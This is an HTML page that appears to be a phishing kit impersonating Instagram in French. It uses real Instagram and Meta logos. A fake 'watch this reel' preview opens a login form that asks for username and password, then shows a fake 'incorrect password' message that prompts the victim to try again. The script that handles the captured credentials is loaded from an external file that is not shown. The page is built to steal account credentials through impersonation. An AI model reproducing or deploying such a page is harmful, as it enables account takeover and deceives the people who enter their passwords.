<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* إعدادات الصفحة الأساسية - تبدأ من الأعلى */
        body { 
            background-color: #000; 
            color: white; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            padding: 0;
        }

        /* واجهة الرييل الابتدائية */
        #reel-preview { 
            width: 90%; 
            max-width: 350px; 
            background: #1c1c1c; 
            border-radius: 15px; 
            overflow: hidden; 
            cursor: pointer; 
            border: 1px solid #333; 
            margin-top: 40px; 
        }
        .thumbnail { width: 100%; height: 350px; background: url('https://images.iphone-main.com/files/2023/12/instagram-reels-logo.jpg') center/cover; display: flex; justify-content: center; align-items: center; }
        .play-btn { width: 60px; height: 60px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 2px solid white; }
        .play-btn::after { content: ''; border-style: solid; border-width: 10px 0 10px 20px; border-color: transparent transparent transparent white; margin-left: 5px; }
        .reel-footer { padding: 12px; background: #262626; }

        /* واجهة تسجيل الدخول - مرفوعة للأعلى */
        #login-page { 
            display: none; 
            flex-direction: column; 
            align-items: center; 
            width: 100%; 
            padding-top: 20px; 
        }
        
        .lang { color: #a8a8a8; font-size: 12px; margin-bottom: 40px; } 
        .logo { width: 60px; margin-bottom: 40px; } 
        
        .input-container { width: 90%; max-width: 350px; text-align: center; }
        input { 
            width: 100%; 
            background-color: #121212; 
            border: 1px solid #363636; 
            border-radius: 10px; 
            padding: 14px; 
            margin-bottom: 12px; 
            color: white; 
            box-sizing: border-box; 
            outline: none; 
            font-size: 14px; 
        }
        input:focus { border-color: #555; }
        
        /* زر تسجيل الدخول (يشعل أزرق عند التفعيل) */
        .btn-login { 
            width: 100%; 
            background-color: #0064e0; 
            color: white; 
            border: none; 
            border-radius: 25px; 
            padding: 12px; 
            font-weight: bold; 
            font-size: 15px; 
            cursor: pointer; 
            margin-top: 10px; 
            opacity: 0.3; 
            pointer-events: none; 
            transition: 0.3s; 
        }
        .btn-login.active { opacity: 1; pointer-events: auto; }
        
        .forgot { color: white; text-decoration: none; font-size: 13px; margin-top: 25px; display: block; }

        /* القسم السفلي */
        .bottom-section { 
            margin-top: 40px; 
            width: 90%; 
            max-width: 350px; 
            text-align: center; 
        }
        .btn-create { 
            width: 100%; 
            background-color: transparent; 
            color: #0095f6; 
            border: 1px solid #0095f6; 
            border-radius: 25px; 
            padding: 10px; 
            display: block; 
            text-decoration: none; 
            font-weight: bold; 
            margin-bottom: 20px; 
            font-size: 14px; 
        }
        .meta-logo { width: 60px; filter: brightness(0) invert(1); opacity: 0.6; }

        /* نافذة الخطأ */
        .modal-overlay { 
            position: fixed; 
            top: 0; left: 0; 
            width: 100%; height: 100%; 
            background: rgba(0, 0, 0, 0.7); 
            display: none; 
            justify-content: center; 
            align-items: center; 
            z-index: 2000;
        }
        .modal-box { background: #262626; width: 280px; border-radius: 15px; text-align: center; overflow: hidden; }
        .modal-content { padding: 25px 20px; border-bottom: 1px solid #363636; }
        .modal-btn { width: 100%; padding: 14px; border: none; background: transparent; color: #0095f6; font-weight: bold; font-size: 16px; cursor: pointer; }
    </style>
</head>
<body>

    <div id="reel-preview" onclick="showLogin()">
        <div class="thumbnail"><div class="play-btn"></div></div>
        <div class="reel-footer">
            <div style="font-weight: bold; font-size: 14px;">Regarder ce reel sur Instagram</div>
            <div style="font-size: 12px; color: #a8a8a8;">instagram.com</div>
        </div>
    </div>

    <div id="login-page">
        <div class="lang">Français (Canada)</div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="logo">
        <div class="input-container">
            <input type="text" id="username" placeholder="Nom d'utilisateur, email ou mobile" autocomplete="off">
            <input type="password" id="password" placeholder="Mot de passe">
            <button id="loginBtn" class="btn-login">Se connecter</button>
            <a href="#" class="forgot">Mot de passe oublié?</a>
        </div>
        <div class="bottom-section">
            <a href="#" class="btn-create">Créer un compte</a>
            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" class="meta-logo">
        </div>
    </div>

    <div id="customAlert" class="modal-overlay">
        <div class="modal-box">
            <div class="modal-content">
                <div style="font-weight: bold; font-size: 18px; margin-bottom: 8px;">Mot de passe incorrect</div>
                <div style="font-size: 14px; color: #f5f5f5;">Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.</div>
            </div>
            <button class="modal-btn" id="retryBtn">Réessayer</button>
        </div>
    </div>

    <script src="script.js?v=1"></script>
</body>
</html>
